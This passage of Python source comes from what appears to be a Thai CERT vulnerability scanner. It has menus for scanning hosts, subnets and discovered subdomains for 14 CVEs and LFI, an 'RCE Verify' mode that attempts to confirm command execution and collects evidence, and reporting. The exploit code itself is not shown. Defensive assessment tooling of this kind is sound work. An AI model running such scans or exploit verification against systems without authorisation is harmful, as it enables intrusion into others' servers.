            return browse_file(title=title, ext=ext, start_dir=str(cur_dir))
        elif low == "p":
            manual = ask("กรอก Path ของไฟล์", required=True,
                         validator=lambda v: (Path(v).expanduser().exists() and Path(v).expanduser().is_file(), f"ไม่พบไฟล์ {v}"))
            return str(Path(manual).expanduser().resolve())
        elif choice.isdigit():
            n = int(choice)
            if 1 <= n <= len(items):
                kind, target_path = items[n - 1]
                if kind == "file":
                    print(f"  {c('✅ เลือกไฟล์:', C.GRN)} {target_path}")
                    return str(target_path)
                else:
                    cur_dir = target_path
                    continue
        elif Path(choice).expanduser().is_file():
            return str(Path(choice).expanduser().resolve())

        print(c("    ❌ ตัวเลือกไม่ถูกต้อง", C.RED))


def browse_directory(title="เลือกโฟลเดอร์ Evidence (ถ้ามี)", start_dir="."):
    """เลือกโฟลเดอร์ผ่าน GUI หรือ Interactive CLI"""
    mode = ask_choice("วิธีระบุโฟลเดอร์:", [
        ("skip", "ข้าม (ไม่มีโฟลเดอร์ Evidence)", "ไม่แนบหลักฐาน RCE เพิ่มเติม", "-"),
        ("browse", "Browse เลือกโฟลเดอร์", "เปิดหน้าต่างเลือกโฟลเดอร์ หรือเลือกจากรายการในเครื่อง", "Path ของโฟลเดอร์ที่เลือก"),
        ("manual", "พิมพ์ระบุ Path ด้วยตนเอง", "พิมพ์ชื่อโฟลเดอร์โดยตรง", "Path ของโฟลเดอร์"),
    ], default="skip")

    if mode == "skip":
        return ""
    if mode == "manual":
        return ask("กรอก Path โฟลเดอร์", default="")

    # GUI directory dialog — macOS ใช้ osascript เท่านั้น (ไม่แตะ tkinter), OS อื่นใช้ tkinter
    selected = _osascript_choose("folder", title, start_dir)
    if selected is None and sys.platform != "darwin":
        selected = _tk_choose("folder", title, start_dir)
    if selected and Path(selected).is_dir():
        print(f"  {c('✅ เลือกโฟลเดอร์:', C.GRN)} {selected}")
        return selected

    # Fallback CLI directory picker
    cur_dir = Path(start_dir).resolve()
    while True:
        section(f"FOLDER BROWSER — {cur_dir}")
        subdirs = sorted(
            [p for p in cur_dir.iterdir() if p.is_dir() and not p.name.startswith(".")],
            key=lambda x: x.stat().st_mtime,
            reverse=True
        )
        for i, d in enumerate(subdirs[:25], 1):
            print(f"    {c(str(i), C.CYN)}) 📁 {d.name}/")
        print(f"\n    {c('s', C.GRN)}) ✅ เลือกโฟลเดอร์ปัจจุบันนี้ ({cur_dir.name})")
        print(f"    {c('u', C.CYN)}) ⬆️  ขึ้นไปโฟลเดอร์ก่อนหน้า (..)")
        print(f"    {c('q', C.CYN)}) ❌ ยกเลิก / ข้าม")
        v = input("\n  เลือกหมายเลขโฟลเดอร์เพื่อเปิดดู หรือกด [s/u/q]: ").strip()
        if v.lower() == "q":
            return ""
        if v.lower() == "s":
            return str(cur_dir)
        if v.lower() == "u":
            cur_dir = cur_dir.parent
            continue
        if v.isdigit() and 1 <= int(v) <= len(subdirs[:25]):
            cur_dir = subdirs[int(v) - 1]
            continue


# ═══════════════════════════════════════════════════════════════════════
# CVE Display + Cross-Menu (NEW)
# ═══════════════════════════════════════════════════════════════════════

def display_cve_list(verbose=False, cves=None):
    """แสดงรายการ CVE"""
    cve_list = cves if cves is not None else CVE_DATABASE
    section(f"CVE ที่จะสแกน ({len(cve_list)} รายการ)")
    print(f"  {c('═' * 70, C.D)}")
    print(f"  {c('CVE ID', C.B):<24} {c('ความรุนแรง', C.B):<16} {c('ชื่อ', C.B)}")
    print(f"  {c('═' * 70, C.D)}")
    for i, cve in enumerate(cve_list, 1):
        sev = cve["severity"]
        sev_color = {"Critical": C.RED, "Medium-High": C.YEL,
                     "Medium": C.YEL, "High": C.RED}.get(sev, C.D)
        cat_mark = c(f"[{cve['category']}]", C.CYN)
        print(f"  {c(str(i), C.CYN)}. {c(cve['id'], C.B):<26} "
              f"{c(sev, sev_color):<24} {cat_mark} {cve['name']}")
        if verbose:
            print(f"     {c('→', C.D)} {cve['desc']}")
            print(f"     {c('→', C.D)} แพตช์: {c(cve['patched'], C.GRN)}")
            print()
    print(f"  {c('═' * 70, C.D)}")
    crit = sum(1 for x in cve_list if x["severity"] == "Critical")
    high = sum(1 for x in cve_list if x["severity"] == "High")
    med = sum(1 for x in cve_list if "Medium" in x["severity"])
    print(f"  สรุป: {c(str(crit), C.RED)} Critical | {c(str(high), C.RED)} High | "
          f"{c(str(med), C.YEL)} Medium | ทั้งหมด {len(cve_list)} รายการ")
    print()


def select_cves_filter():
    """เมนูให้ผู้ใช้เลือกกรอง CVE: ทั้งหมด / ตามความรุนแรง / ตามประเภท / เลือกรายตัว"""
    print(f"\n  {c('🎯 รูปแบบการเลือก CVE สำหรับสแกน:', C.B)}")
    print(f"    {c('1', C.CYN)}) สแกนทั้งหมด ({len(CVE_DATABASE)} CVEs - ค่าเริ่มต้น)")
    print(f"    {c('2', C.CYN)}) กรองตามระดับความรุนแรง (Severity: Critical / High / Medium)")
    print(f"    {c('3', C.CYN)}) กรองตามประเภทของ CVE (Category: PHP, NGINX, Node.js, GitLab)")
    print(f"    {c('4', C.CYN)}) เลือกรายตัวตามหมายเลข (Custom Select เช่น 1,3,5 หรือ 1-4)")
    choice = input("  เลือกโหมด [1-4] (กด Enter = 1): ").strip()

    if choice == "2":
        print(f"\n  {c('เลือกระดับความรุนแรง:', C.B)}")
        print(f"    {c('1', C.CYN)}) เฉพาะ Critical เท่านั้น")
        print(f"    {c('2', C.CYN)}) Critical + High")
        print(f"    {c('3', C.CYN)}) ทุกระดับ (Critical + High + Medium)")
        s_choice = input("  เลือก [1-3] (กด Enter = 1): ").strip()
        if s_choice == "2":
            allowed = {"Critical", "High"}
        elif s_choice == "3":
            allowed = {"Critical", "High", "Medium", "Medium-High"}
        else:
            allowed = {"Critical"}
        selected = [c for c in CVE_DATABASE if any(a in c["severity"] for a in allowed)]
        return selected

    elif choice == "3":
        cats = sorted(list(set(c["category"] for c in CVE_DATABASE)))
        print(f"\n  {c('เลือกประเภทของ CVE (เลือกหลายประเภทได้ เช่น 1,2):', C.B)}")
        for idx, cat in enumerate(cats, 1):
            count = sum(1 for c in CVE_DATABASE if c["category"] == cat)
            print(f"    {c(str(idx), C.CYN)}) {cat} ({count} รายการ)")
        sel_cats_in = input("  เลือกหมายเลขประเภท: ").strip()
        chosen_cats = set()
        for part in sel_cats_in.replace(" ", "").split(","):
            if part.isdigit() and 1 <= int(part) <= len(cats):
                chosen_cats.add(cats[int(part) - 1])
        if not chosen_cats:
            print(c("  ไม่ได้เลือกประเภท — ใช้ค่าเริ่มต้น (ทั้งหมด)", C.YEL))
            return list(CVE_DATABASE)
        selected = [c for c in CVE_DATABASE if c["category"] in chosen_cats]
        return selected

    elif choice == "4":
        display_cve_list(verbose=False, cves=CVE_DATABASE)
        nums_in = input("  ระบุหมายเลข CVE ที่ต้องการสแกน (เช่น 1,3,5 หรือ 1-5): ").strip()
        indices = set()
        for token in nums_in.replace(" ", "").split(","):
            if "-" in token:
                parts = token.split("-")
                if len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit():
                    for n in range(int(parts[0]), int(parts[1]) + 1):
                        indices.add(n)
            elif token.isdigit():
                indices.add(int(token))
        selected = [c for i, c in enumerate(CVE_DATABASE, 1) if i in indices]
        if not selected:
            print(c("  ไม่ได้ระบุหมายเลขที่ถูกต้อง — ใช้ค่าเริ่มต้น (ทั้งหมด)", C.YEL))
            return list(CVE_DATABASE)
        return selected

    return list(CVE_DATABASE)


def confirm_scan_scope(targets_desc, opts=None):
    """แสดง CVE + ตัวเลือกกรอง + ขอบเขต แล้วขอ confirm"""
    global _NO_INTERACTIVE
    if _NO_INTERACTIVE:
        return True
    selected_cves = list(CVE_DATABASE)
    display_cve_list(verbose=False, cves=selected_cves)

    if ask_yn("ต้องการกรอง CVE ที่จะสแกนหรือไม่ (ตามตัวเลือก/ความรุนแรง/ประเภท)?", False):
        selected_cves = select_cves_filter()
        display_cve_list(verbose=False, cves=selected_cves)

    if opts is not None:
        opts["selected_cves"] = {c["id"] for c in selected_cves}

    section("ขอบเขตการสแกน")
    print(f"  {targets_desc}")
    print()
    return ask_yn(f"เริ่มสแกน {len(selected_cves)} CVE นี้?", default=True)


def post_action_menu(last_result=None):
    """หลังจบ action — เสนอทางเลือกไปเมนูอื่น (cross-menu) พร้อมแสดง Output ที่ได้จากรอบล่าสุด"""

    print()
    if last_result and isinstance(last_result, dict):
        section("สรุปไฟล์ Output ที่ได้จากการทำงานล่าสุด")
        if last_result.get("json_path"):
            print(f"    📄 {c('JSON ผลสแกน   :', C.B)} {c(last_result['json_path'], C.GRN)}")
        if last_result.get("evidence_dir"):
            print(f"    📁 {c('Evidence Dir   :', C.B)} {c(last_result['evidence_dir'], C.GRN)} (transcript.log, metadata.json, summary.json)")
        if last_result.get("pdf"):
            print(f"    📕 {c('PDF Report     :', C.B)} {c(last_result['pdf'], C.GRN)}")
        if last_result.get("excel"):
            print(f"    📊 {c('Excel (5 ชีต) :', C.B)} {c(last_result['excel'], C.GRN)}")
        if last_result.get("thaicert_csv"):
            print(f"    📄 {c('CSV 8 กลุ่ม   :', C.B)} {c(last_result['thaicert_csv'], C.GRN)}")
        if last_result.get("html"):
            print(f"    🌐 {c('HTML แดชบอร์ด :', C.B)} {c(last_result['html'], C.GRN)}")
        if last_result.get("out_dir"):
            print(f"    📁 {c('Output Dir     :', C.B)} {c(last_result['out_dir'], C.GRN)}")
        if isinstance(last_result.get("report"), dict):
            rep = last_result["report"]
            if rep.get("pdf"):
                print(f"    📕 {c('PDF Report     :', C.B)} {c(rep['pdf'], C.GRN)}")
            if rep.get("excel"):
                print(f"    📊 {c('Excel (5 ชีต) :', C.B)} {c(rep['excel'], C.GRN)}")
            if rep.get("thaicert_csv"):
                print(f"    📄 {c('CSV 8 กลุ่ม   :', C.B)} {c(rep['thaicert_csv'], C.GRN)}")
            if rep.get("html"):
                print(f"    🌐 {c('HTML แดชบอร์ด :', C.B)} {c(rep['html'], C.GRN)}")
            if rep.get("out_dir"):
                print(f"    📁 {c('Output Dir     :', C.B)} {c(rep['out_dir'], C.GRN)}")

    section("ขั้นตอนถัดไป (ทำต่อ)")
    options = [
        ("scan", "2) Scan ช่องโหว่อีกครั้ง", "สแกนเป้าหมายใหม่ (Single / CIDR / Wildcard)", "ไฟล์ JSON ผลการสแกน (scan_*.json)"),
        ("verify", "3) RCE Verify (พิสูจน์ช่องโหว่)", "ทดสอบเจาะระบบยืนยัน RCE บนเป้าหมาย", "โฟลเดอร์หลักฐาน evidence/<host>_<timestamp>/"),
        ("report", "4) Generate Report (สร้างรายงาน)", "Browse เลือกไฟล์ JSON เพื่อออกรายงานสรุปผู้บริหาร", "ไฟล์รายงาน PDF + CSV + กราฟ PNG ใน reports/"),
        ("pipeline", "5) Full Pipeline (ครบวงจร: Single / CIDR / Wildcard)", "รันอัตโนมัติ Scan → RCE Verify → Generate Report", "ไฟล์ JSON + โฟลเดอร์ Evidence + รายงาน PDF/CSV"),
        ("cve", "1) ดูรายการ CVE ทั้ง 14 รายการ", "แสดงตารางข้อมูลช่องโหว่และเวอร์ชันที่แก้ไข", "ตารางรายละเอียดบนหน้าจอ"),
        ("main", "กลับหน้าเมนูหลัก (Main Menu)", "", ""),
        ("quit", "ออกจากโปรแกรม (Exit)", "", ""),
    ]
    return ask_choice("เลือกเมนูที่ต้องการทำต่อ:", options, default="main")


# ═══════════════════════════════════════════════════════════════════════
# Menu Action 1: Scan
# ═══════════════════════════════════════════════════════════════════════

def menu_scan():
    section("เมนู 2: SCAN ONLY — สแกนตรวจหาช่องโหว่ (14 CVEs & LFI)")
    print(f"  {c('📦 Output ที่จะได้จากเมนูนี้:', C.GRN)} ไฟล์ JSON บันทึกผลสแกน เช่น {c('scan_<mode>_<target>_<timestamp>.json', C.B)}")
    print(f"  {c('   (ประกอบด้วยข้อมูล Server/PHP Fingerprint, ช่องโหว่ 14 CVEs, จุดเสี่ยง LFI และ Session)', C.D)}\n")

    # ── โหมดการสแกนเลือกไว้ตั้งแต่เปิดโปรแกรมแล้ว (เมนูหลัก) — แสดงให้เห็นว่ากำลังใช้โหมดใด ──
    _scan_mode = _SCAN_MODE
    print(f"  {c('โหมดสแกน:', C.B)} {c(_scan_mode_label(_scan_mode), C.CYN)} "
          f"{c('(เปลี่ยนได้ที่เมนูหลัก)', C.D)}\n")

    mode = ask_choice("เลือกรูปแบบเป้าหมายที่ต้องการสแกน:", [
        ("single", "Single Host (เป้าหมายเดี่ยว)",
         "ระบุ IP, Domain หรือ URL เดี่ยวเพื่อสแกนเชิงลึก",
         "ไฟล์ scan_single_<target>_<timestamp>.json"),
        ("cidr", "CIDR Subnet (ทั้งวงแลน/ซับเน็ต)",
         "ระบุวงจรเครือข่าย เช่น 192.168.1.0/24 เพื่อสแกนทุกเครื่องในวง",
         "ไฟล์ scan_cidr_<subnet>_<timestamp>.json (รวมผลทุกเครื่อง)"),
        ("wildcard", "Wildcard Domain (ค้นหา Subdomains ทั้งหมด)",
         "ค้นหา Subdomain จาก crt.sh / SecurityTrails / DNS Bruteforce แล้วสแกนทั้งหมด",
         "ไฟล์ scan_wildcard_<domain>_<timestamp>.json (รวมผลทุก Subdomain)"),
        ("filelist", "รายชื่อโฮสต์จากไฟล์ (CSV/TXT — บรรทัดละโฮสต์)",
         "เบราซ์/อัปโหลดไฟล์ CSV หรือ TXT ระบบกรองให้เหลือแต่โดเมนจริง (ตัด http:// และ path ออก) แล้วสแกนครบทุกโฮสต์",
         "ไฟล์ scan_filelist_<ชื่อไฟล์>_<timestamp>.json (รวมผลทุกโฮสต์)"),
        ("back", "← กลับเมนูหลัก", "", ""),
    ], default="single")
    if mode == "back": return None

    if mode == "single":
        target = ask("Target (IP/domain/URL)", required=True)
        targets = [(target, "single")]
        name = safe_name(target.replace("https://", "").replace("http://", "").replace("/", "_"))
        scope = f"Target: {target}"
    elif mode == "cidr":
        cidr = ask("CIDR (เช่น 192.168.1.0/24)", required=True)
        targets = resolve_cidr(cidr)
        if not targets: return None
        name = safe_name(cidr.replace("/", "_").replace(".", "_"))
        scope = f"CIDR: {cidr} ({len(targets)} hosts)"
    elif mode == "wildcard":
        dom = ask("Domain (เช่น example.ac.th)", required=True)
        st = ask("SecurityTrails key (Enter=ข้าม)", default="")
        bf = ask_yn("ใช้ DNS bruteforce?", False)
        wl = ask("Wordlist path", "") if bf else ""
        ms = ask_int("Max subdomains", 2000, 1, 10000)
        targets = resolve_wildcard(dom, bf, wl, st, ms)
        if not targets: return None
        name = safe_name(dom.replace(".", "_"))
        scope = f"Wildcard: {dom} ({len(targets)} subdomains)"
    else:  # filelist — อ่านรายชื่อโฮสต์จากไฟล์ CSV/TXT
        fpath = browse_file(title="เลือกไฟล์รายชื่อโฮสต์ (CSV/TXT)",
                            ext=(".csv", ".txt"), start_dir=".")
        if not fpath:
            print(c("  ยกเลิก (ไม่ได้เลือกไฟล์)", C.YEL)); return None
        hosts, fstat = read_host_list_file(fpath)
        if not hosts:
            print(c("  ❌ ไม่พบโดเมน/IP ที่ถูกต้องในไฟล์", C.RED)); return None
        print(f"\n  {c('📋 ผลการกรองไฟล์:', C.GRN)} {Path(fpath).name}")
        print(f"     บรรทัดข้อมูล: {fstat['raw']}  |  "
              f"โดเมนที่ใช้ได้ (ไม่ซ้ำ): {c(str(fstat['valid']), C.CYN)}  |  "
              f"ซ้ำ: {fstat['dup']}  |  ข้าม (ไม่ใช่โดเมน): {fstat['invalid']}")
        preview = ", ".join(hosts[:8]) + (f"  …(+{len(hosts)-8})" if len(hosts) > 8 else "")
        print(f"     {c('ตัวอย่างโฮสต์:', C.B)} {preview}")
        if fstat["skip_samples"]:
            print(f"     {c('ตัวอย่างบรรทัดที่ข้าม:', C.YEL)} {' | '.join(fstat['skip_samples'])}")
        if not ask_yn(f"ยืนยันสแกนทั้งหมด {len(hosts)} โฮสต์?", True):
            print(c("  ยกเลิก", C.YEL)); return None
        targets = [(f"https://{h}", "filelist") for h in hosts]
        name = safe_name(Path(fpath).stem)
        scope = f"File list: {Path(fpath).name} ({len(hosts)} hosts)"

    opts = {"depth": _SCAN_DEPTH, "max_pages": _SCAN_MAX_PAGES, "timeout": 8.0,
            "target_threads": 3, "lfi_threads": 5, "rate": 5.0,
            "skip_lfi": False, "verbose": False, "no_verify_ssl": False, "online_cve": False,
            "lan_mode": False, "discover": (mode != "single")}

    opts["scan_mode"] = _scan_mode

    if ask_yn("ตั้งค่าการสแกนขั้นสูง (Threads / Crawl Depth / Skip LFI)?", False):
        opts["target_threads"] = ask_int("Threads", 3, 1, 30)
        opts["depth"] = ask_int("Crawl depth", _SCAN_DEPTH, 1, 20)
        opts["max_pages"] = ask_int("Max pages/target", _SCAN_MAX_PAGES, 5, 5000)
        opts["crawl_budget"] = ask_int("Crawl timeout ต่อโฮสต์ (วินาที)", 30, 5, 600)
        opts["host_budget"] = ask_int("เวลารวมสูงสุดต่อโฮสต์ (วินาที) เกินแล้วข้าม", 60, 10, 600)
        opts["skip_lfi"] = ask_yn("Skip LFI scan?", False)
        opts["verbose"] = ask_yn("Verbose?", False)
        opts["online_cve"] = ask_yn("ค้น CVE ออนไลน์ (CIRCL) ตามเวอร์ชันที่พบ? [ต้องต่อเน็ต]", False)
        if mode != "single":
            opts["discover"] = ask_yn("Host discovery ก่อน (เคาะพอร์ตเว็บ ข้ามไอพีตาย — เร็วกว่ามากกับ CIDR)?", True)

    # ── แสดง CVE + ขอบเขต ก่อนสแกน ──
    if not confirm_scan_scope(scope, opts):
        print(c("  ยกเลิก", C.YEL))
        return None

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = ask("ชื่อไฟล์ JSON Output", f"scan_{mode}_{name}_{ts}.json")

    cve_count = len(opts.get("selected_cves", CVE_DATABASE))
    print(f"\n  {c(f'เริ่มสแกน {len(targets)} targets × {cve_count} CVE...', C.CYN)}")
    results = run_scan(targets, opts)

    json_path = unique_output_path(Path(out).parent or ".", Path(out).stem, ".json")
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump({"target": target if mode == "single" else scope,
                   "scan_time": datetime.now().isoformat(),
                   "total_targets": len(results), "results": results, "scan_opts": opts, "tool_version": "RMUT CERT All-in-One v" + VERSION},
                  f, indent=2, ensure_ascii=False, default=list)
    print(f"\n  {c('✅ บันทึกไฟล์ JSON สำเร็จ:', C.GRN)} {json_path}")

    if len(results) >= 1:
        reachable = [r for r in results if r.get("reachable")]
        print(f"  Reachable: {len(reachable)}/{len(results)}")
        crit = sum(r.get("summary", {}).get("critical", 0) for r in results)
        if crit:
            print(f"  {c(f'🔴 {crit} critical findings', C.RED)}")
        elif len(results) == 1:
            r0 = results[0]
            if not r0.get("reachable"):
                print(f"  {c('⚠ เป้าหมายไม่สามารถเชื่อมต่อได้: ' + str(r0.get('error', '')), C.YEL)}")
            else:
                sm = r0.get("summary", {})
                print(f"  สรุปผล ({r0.get('target', '')}): วิกฤต {sm.get('critical', 0)} · สูง {sm.get('high', 0)} · กลาง {sm.get('medium', 0)} · ปลอดภัย {sm.get('safe', 0)} · ไม่ทราบ {sm.get('unknown', 0)}")

    return {"json_path": str(json_path), "results": results}


# ═══════════════════════════════════════════════════════════════════════
# Menu Action 2: RCE Verify — 4 โหมดการสแกน
# ═══════════════════════════════════════════════════════════════════════

def menu_rce_verify():
    section("เมนู 3: RCE VERIFY — พิสูจน์การรันคำสั่ง (Exploit Verification & Chain-of-Custody)")
    print(f"  {c('📦 Output ที่จะได้จากเมนูนี้:', C.GRN)} โฟลเดอร์หลักฐาน {c('evidence/<target>_<timestamp>/', C.B)}")
    print(f"     • {c('transcript.log', C.CYN)}    — บันทึกทุกขั้นตอนพร้อมเวลาและ SHA-256 (Chain of Custody)")
    print(f"     • {c('metadata.json', C.CYN)}     — ข้อมูล Session, ผู้ทดสอบ, เวลาเริ่ม-จบ และผลการพิสูจน์")
    print(f"     • {c('summary.json', C.CYN)}      — สรุปผล Verdict (RCE_CONFIRMED / CANARY_CONFIRMED / NOT_CONFIRMED)")
    print(f"     • {c('rce_proof.txt', C.CYN)}     — ผลลัพธ์คำสั่ง php_uname() และ id (กรณี RCE สำเร็จ)")
    print(f"     • {c('rce_response.html', C.CYN)} — ข้อมูล HTTP Response ดิบเพื่อใช้เป็นหลักฐานอ้างอิง")
    print(f"  {c('⚠  หมายเหตุ: RCE Verify จะทดสอบกับเป้าหมายเดี่ยว (Private IP) เท่านั้น', C.YEL)}\n")

    mode = ask_choice("เลือกวิธีระบุเป้าหมายเพื่อทำ RCE Verify:", [
        ("single", "Single Host (ระบุเป้าหมายเดี่ยวโดยตรง)",
         "กรอก IP / URL ของเครื่องเป้าหมายเพื่อทดสอบ RCE ทันที",
         "โฟลเดอร์หลักฐาน evidence/<host>_<timestamp>/"),
        ("from_json", "Browse เลือกจากไฟล์ผลสแกนเดิม (JSON)",
         "เปิดหน้าต่าง Browse เลือกไฟล์ JSON ที่สแกนไว้ แล้วเลือกเครื่องที่พบช่องโหว่",
         "โฟลเดอร์หลักฐาน evidence/<host>_<timestamp>/"),
        ("cidr", "CIDR Subnet (สแกนทั้งวงแลนก่อน แล้วเลือก 1 เครื่อง)",
         "สแกนหาเครื่องที่มีทั้ง Critical CVE + LFI ในวงแลน แล้วเลือกเจาะพิสูจน์ 1 เครื่อง",
         "ไฟล์ scan_cidr_*.json + โฟลเดอร์หลักฐาน evidence/<host>_<timestamp>/"),
        ("wildcard", "Wildcard Domain (สแกน Subdomains ก่อน แล้วเลือก 1 เครื่อง)",
         "ค้นหาและสแกน Subdomain ทั้งหมด แล้วเลือกเครื่องที่เข้าเงื่อนไขมาพิสูจน์ 1 เครื่อง",
         "ไฟล์ scan_wildcard_*.json + โฟลเดอร์หลักฐาน evidence/<host>_<timestamp>/"),
        ("back", "← กลับเมนูหลัก", "", ""),
    ], default="single")

    if mode == "back": return None

    # ── โหมด 1: Single host ──
    if mode == "single":
        target = ask("Target (IP / domain / URL)", required=True)
        if not target.startswith(("http://", "https://")):
            target = "https://" + target

        if not is_private_host(target):
            if _OWN_TARGET:
                print(c(f"  ⚠  {target} เป็น public IP — ข้าม guard เพราะมี --i-own-this-target", C.YEL))
            elif not ask_yn("ดำเนินการต่อ? (ไม่แนะนำ)", False):
                return None

        print()
        lfi_url = ask("LFI URL (มี FUZZ, Enter=auto-detect)", default="")
        session_ep = ask("Session endpoint (Enter=auto-detect)", default="")
        ev_dir = ask("Evidence dir (Enter=auto)", default="")

        verdict, summary, ev = run_rce_verify(
            target,
            lfi_url=lfi_url or None,
            session_endpoint=session_ep or None,
            evidence_dir=ev_dir or None,
            i_own_this_target=_OWN_TARGET,
        )
        if ev: print(f"\n  {c('✅ Evidence:', C.GRN)} {ev}")
        return {"verdict": verdict, "evidence_dir": ev}

    # ── โหมด 2: CIDR ──
    if mode == "cidr":
        cidr = ask("CIDR", required=True)
        targets = resolve_cidr(cidr)
        if not targets: return None
        if not confirm_scan_scope(f"CIDR: {cidr} ({len(targets)} hosts)"):
            return None

        opts = {"depth": _SCAN_DEPTH, "max_pages": _SCAN_MAX_PAGES, "timeout": 8.0,
                "target_threads": 5, "lfi_threads": 5, "rate": 5.0,
                "skip_lfi": False, "verbose": False, "no_verify_ssl": False, "online_cve": False, "lan_mode": False}
        print(f"\n  [*] Scanning {len(targets)} hosts ...")
        results = run_scan(targets, opts)

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        name = safe_name(cidr.replace("/", "_").replace(".", "_"))
        json_path = unique_output_path(".", f"scan_cidr_{name}_{ts}", ".json")
        with open(json_path, "w") as f:
            json.dump({"scan_time": datetime.now().isoformat(),
                       "total_targets": len(results), "results": results, "scan_opts": opts, "tool_version": "RMUT CERT All-in-One v" + VERSION},
                      f, indent=2, ensure_ascii=False, default=list)
        print(f"  {c('✅ JSON:', C.GRN)} {json_path}")
        return _select_and_verify_host(results, json_path)

    # ── โหมด 3: Wildcard ──
    if mode == "wildcard":
        dom = ask("Domain", required=True)
        st = ask("SecurityTrails key (Enter=ข้าม)", default="")
        bf = ask_yn("ใช้ DNS bruteforce?", False)
        wl = ask("Wordlist path", "") if bf else ""
        ms = ask_int("Max subdomains", 500, 1, 10000)

        targets = resolve_wildcard(dom, bf, wl, st, ms)
        if not targets: return None
        if not confirm_scan_scope(f"Wildcard: {dom} ({len(targets)} subdomains)"):
            return None

        opts = {"depth": _SCAN_DEPTH, "max_pages": _SCAN_MAX_PAGES, "timeout": 8.0,
                "target_threads": 5, "lfi_threads": 5, "rate": 5.0,
                "skip_lfi": False, "verbose": False, "no_verify_ssl": False, "online_cve": False, "lan_mode": False}
        print(f"\n  [*] Scanning {len(targets)} subdomains ...")
        results = run_scan(targets, opts)

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        name = safe_name(dom.replace(".", "_"))
        json_path = unique_output_path(".", f"scan_wildcard_{name}_{ts}", ".json")
        with open(json_path, "w") as f:
            json.dump({"scan_time": datetime.now().isoformat(),
                       "total_targets": len(results), "results": results, "scan_opts": opts, "tool_version": "RMUT CERT All-in-One v" + VERSION},
                      f, indent=2, ensure_ascii=False, default=list)
        print(f"  {c('✅ JSON:', C.GRN)} {json_path}")
        return _select_and_verify_host(results, json_path)

    # ── โหมด 4: From JSON (พร้อม Browse) ──
    if mode == "from_json":
        json_path = browse_file(title="เลือกไฟล์ JSON ผลการสแกนสำหรับทำ RCE Verify", ext=".json")
        if not json_path:
            print(c("  ยกเลิกการเลือกไฟล์", C.YEL))
            return None
        with open(json_path, encoding="utf-8") as f:
            jdata = json.load(f)
        results = jdata["results"] if "results" in jdata else [jdata]
        return _select_and_verify_host(results, json_path)

    return None


def _select_and_verify_host(results, json_path=None):
    """กรอง hosts → แสดง → เลือก 1 → verify"""
    reachable = [r for r in results if r.get("reachable")]
    if not reachable:
        print(c("\n  ❌ ไม่พบ reachable hosts", C.RED))
        return None

    vulnerable = []
    for h in reachable:
        crit = h.get("summary", {}).get("critical", 0)
        lfi = h.get("lfi_findings", [])
        if crit > 0 and lfi:
            vulnerable.append({
                "target": h["target"],
                "critical": crit,
                "lfi_url": lfi[0]["url"] if lfi else None,
                "session_url": h.get("preconditions", {}).get("tested_url"),
            })

    print()
    print(f"  {c('═' * 60, C.D)}")
    print(f"  Reachable      : {len(reachable)}")
    print(f"  Vulnerable+LFI : {len(vulnerable)}")
    print(f"  {c('═' * 60, C.D)}")
    print()

    if not vulnerable:
        print(c("  ⚠  ไม่พบ host ที่มีทั้ง critical + LFI", C.YEL))
        crit_only = [h for h in reachable if h.get("summary", {}).get("critical", 0) > 0]
        if crit_only:
            print(f"\n  {c('hosts ที่มี critical แต่ไม่มี LFI:', C.D)}")
            for h in crit_only[:10]:
                print(f"    • {h['target']} ({h['summary']['critical']} critical)")
            if len(crit_only) > 10:
                print(f"    ... และอีก {len(crit_only) - 10} hosts")
            print(f"\n  {c('คำแนะนำ:', C.D)}")
            print(f"    • ตรวจ LFI ด้วยตนเองก่อน")
            print(f"    • หรือใช้ single mode + --lfi-url")
        return None

    print(f"  {c(f'พบ {len(vulnerable)} hosts พร้อม verify:', C.GRN)}")
    print()
    max_show = min(len(vulnerable), 20)
    for i, v in enumerate(vulnerable[:max_show], 1):
        crit_mark = c(f"{v['critical']}c", C.RED)
        lfi_mark = c("LFI✓", C.GRN)
        print(f"    {c(str(i), C.CYN)}) {v['target']}  [{crit_mark} {lfi_mark}]")
    if len(vulnerable) > max_show:
        print(f"    ... และอีก {len(vulnerable) - max_show} hosts")

    print()
    idx_str = ask(f"เลือก host [1-{max_show}]",
                  default="1",
                  validator=lambda v: (v.isdigit() and 1 <= int(v) <= max_show,
                                        "ต้องเป็น 1-" + str(max_show)))
    selected = vulnerable[int(idx_str) - 1]

    print()
    print(f"  {c('═' * 60, C.D)}")
    print(f"  Target         : {c(selected['target'], C.B)}")
    print(f"  Critical CVE   : {selected['critical']}")
    print(f"  LFI URL        : {selected['lfi_url']}")
    print(f"  Session URL    : {selected['session_url'] or '(auto-detect)'}")
    print(f"  {c('═' * 60, C.D)}")
    print()

    if not ask_yn("ยืนยัน verify host นี้?", default=True):
        return None

    verdict, summary, ev = run_rce_verify(
        selected["target"],
        lfi_url=selected["lfi_url"],
        session_endpoint=selected["session_url"],
        evidence_dir=None,
        i_own_this_target=_OWN_TARGET,
    )
    if ev: print(f"\n  {c('Evidence:', C.GRN)} {ev}")
    return {"verdict": verdict, "evidence_dir": ev, "json_path": str(json_path) if json_path else None}


# ═══════════════════════════════════════════════════════════════════════
# Menu Action 3: Report (เมนูที่ 4)
# ═══════════════════════════════════════════════════════════════════════

def menu_generate_report(default_json=None):
    section("เมนู 4: GENERATE REPORT — สร้างรายงานสรุปผล (PDF / CSV / Charts)")
    print(f"  {c('📦 Output ที่จะได้จากเมนูนี้ (บันทึกในโฟลเดอร์ reports/):', C.GRN)}")
    print(f"     1. {c('ไฟล์ PDF (report_<target>.pdf)', C.B)} — รายงานภาษาไทย 6 บท (ปก, บทสรุปผู้บริหาร, แดชบอร์ด, ตารางช่องโหว่, คำแนะนำ, ภาคผนวก)")
    print(f"     2. {c('ไฟล์ CSV (report_<target>.csv)', C.B)} — ตารางรายการช่องโหว่ทั้งหมด เปิดด้วย Microsoft Excel รองรับภาษาไทย (UTF-8 BOM)")
    print(f"     3. {c('กราฟสถิติ PNG 4 รูป (reports/charts/)', C.B)} — กราฟวงกลมความรุนแรง, กราฟแท่งสถานะ, กราฟแยกหมวดหมู่ PHP/NGINX")
    print(f"     4. {c('สำเนาโฟลเดอร์หลักฐาน (reports/evidence_<target>/)', C.B)} — (กรณีเลือกแนบ Evidence Dir)\n")

    pick_choices = [
        ("browse", "Browse เลือกไฟล์ JSON (เปิดหน้าต่างเลือกไฟล์ หรือเลือกจากรายการในเครื่อง)",
